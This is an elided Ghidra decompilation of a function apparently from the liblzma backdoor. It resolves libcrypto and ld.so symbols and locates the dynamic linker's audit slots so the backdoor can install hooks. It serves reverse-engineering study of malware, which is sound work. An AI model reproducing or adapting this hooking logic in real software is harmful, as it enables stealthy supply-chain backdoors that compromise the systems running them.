// /home/kali/xzre-ghidra/xzregh/1051E0_resolve_ldso_audit_offsets.c
// Function: resolve_ldso_audit_offsets @ 0x1051E0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall resolve_ldso_audit_offsets(backdoor_data_handle_t * data, ptrdiff_t * libname_offset, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)
...
BOOL resolve_ldso_audit_offsets
...

{
  ...
  wipe_stride = 0;
  probe_success = secret_data_append_bits_from_call_site((secret_data_shift_cursor_t)0x0,10,0,FALSE);
  if (probe_success != FALSE) {
    ...
    symbol_entry = elf_gnu_hash_lookup_symbol(target_image,STR_EC_POINT_point2oct,0);
    if (data->cached_elf_handles->liblzma->gnurelro_present != FALSE) {
      ...
      symbol_entry = elf_gnu_hash_lookup_symbol
                         (data->cached_elf_handles->libcrypto,STR_EC_KEY_get0_public_key,0);
      ...
      symbol_entry = elf_gnu_hash_lookup_symbol(elf_handles->ldso,STR_dl_audit_symbind_alt,0);
      if (symbol_entry != (Elf64_Sym *)0x0) {
        ...
        if ((probe_success != FALSE) &&
          ...
          probe_success = find_dl_naudit_slot(data->cached_elf_handles->ldso,
                                      data->cached_elf_handles->libcrypto,hooks,imported_funcs);
          if ((probe_success != FALSE) &&
             (probe_success = find_l_audit_any_plt_mask_via_symbind_alt
                                (data,*libname_offset,hooks,imported_funcs), probe_success != FALSE)) {
